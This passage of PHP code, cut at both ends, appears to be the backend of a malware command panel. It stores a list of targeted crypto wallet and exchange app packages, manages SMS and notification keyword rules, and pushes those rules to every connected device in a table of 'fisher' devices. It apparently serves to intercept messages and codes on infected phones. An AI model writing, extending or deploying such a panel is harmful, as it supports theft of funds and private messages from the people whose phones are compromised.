        if ($this->method === 'POST' || $this->method === 'PUT') {
            $b = $this->body;
            $pkg = (string)($b['package_name'] ?? $b['packageName'] ?? '');
            if ($pkg === '') return $this->json(['success' => true, 'data' => null]);
            $row = [
                'package_name' => $pkg,
                'name' => (string)($b['name'] ?? ''),
                'category' => (string)($b['category'] ?? 'exchange'),
                'region' => (string)($b['region'] ?? ''),
                'enabled' => array_key_exists('enabled', $b) ? (!empty($b['enabled']) ? 1 : 0) : 1,
                'created_at' => time(),
            ];
            $ex = Db::table('fisher_cryptowallets')->where('package_name', $pkg)->find();
            if ($ex) Db::table('fisher_cryptowallets')->where('id', (int)$ex['id'])->update($row);
            else Db::table('fisher_cryptowallets')->insert($row);
            return $this->json(['success' => true, 'data' => null]);
        }
        $rows = Db::table('fisher_cryptowallets')->order('id', 'desc')->select()->toArray();
        $out = [];
        foreach ($rows as $r) {
            $out[] = [
                'id' => (int)$r['id'],
                'package_name' => (string)$r['package_name'],
                'name' => (string)($r['name'] ?? ''),
                'category' => (string)($r['category'] ?? 'exchange'),
                'region' => (string)($r['region'] ?? ''),
                'enabled' => (bool)($r['enabled'] ?? 1),
                'created_at' => (int)($r['created_at'] ?? 0),
            ];
        }
        return $this->json($out);
    }

    // ================= sms / notification keyword rules =================
    protected function notiRule(string $table, string $col, array $seg)
    {
        $id = (int)($seg[1] ?? 0);
        if ($this->method === 'DELETE') {
            if ($id > 0) Db::table($table)->where('id', $id)->delete();
            else Db::table($table)->delete(true);
            return $this->json(['success' => true, 'data' => null]);
        }
        if ($this->method === 'POST' || $this->method === 'PUT') {
            $b = $this->body;
            $val = trim((string)($b[$col] ?? $b['value'] ?? $b['keyword'] ?? $b['package'] ?? ''));
            if ($val !== '') {
                $row = [$col => $val, 'enabled' => array_key_exists('enabled', $b) ? (!empty($b['enabled']) ? 1 : 0) : 1, 'created_at' => time()];
                if ($col === 'package_name') $row['app_name'] = (string)($b['app_name'] ?? $b['appName'] ?? '');
                $ex = Db::table($table)->where($col, $val)->find();
                if ($ex) { unset($row['created_at']); Db::table($table)->where('id', (int)$ex['id'])->update($row); }
                else Db::table($table)->insert($row);
            }
            return $this->json(['success' => true, 'data' => null]);
        }
        $rows = Db::table($table)->order('id', 'desc')->select()->toArray();
        $out = [];
        foreach ($rows as $r) {
            $item = ['id' => (int)$r['id'], 'enabled' => (bool)($r['enabled'] ?? 1), 'created_at' => (int)($r['created_at'] ?? 0)];
            $item[$col] = (string)($r[$col] ?? '');
            if ($col === 'keyword') $item['keyword'] = (string)($r['keyword'] ?? '');
            else { $item['package_name'] = (string)($r['package_name'] ?? ''); $item['app_name'] = (string)($r['app_name'] ?? ''); }
            $out[] = $item;
        }
        return $this->json($out);
    }

    protected function notifyrules(array $seg)
    {
        $sub = (string)($seg[1] ?? '');
        if ($sub === 'push' && $this->method === 'POST') {
            $kws = Db::table('fisher_sms_notify_keywords')->where('enabled', 1)->column('keyword');
            $pkgs = Db::table('fisher_notif_notify_packages')->where('enabled', 1)->column('package_name');
            $devices = Db::table('fisher_devices')->where('is_connected', 1)->column('device_id');
            $rules = ['keywords' => $kws, 'packages' => $pkgs];
            foreach ($devices as $did) $this->notifyWs((string)$did, 'NOTIFY_RULES', $rules);
            Db::table('fisher_notify_rules')->insert([
                'device_id' => '', 'rule_type' => 'push',
                'payload' => json_encode($rules, JSON_UNESCAPED_UNICODE),
                'pushed_at' => time(), 'created_at' => time(),
            ]);
            return $this->json(['success' => true, 'message' => '已推送 ' . count($kws) . ' 个关键词 / ' . count($pkgs) . ' 个包名到 ' . count($devices) . ' 台在线设备']);
        }
        return $this->json(['success' => true, 'data' => null]);
    }

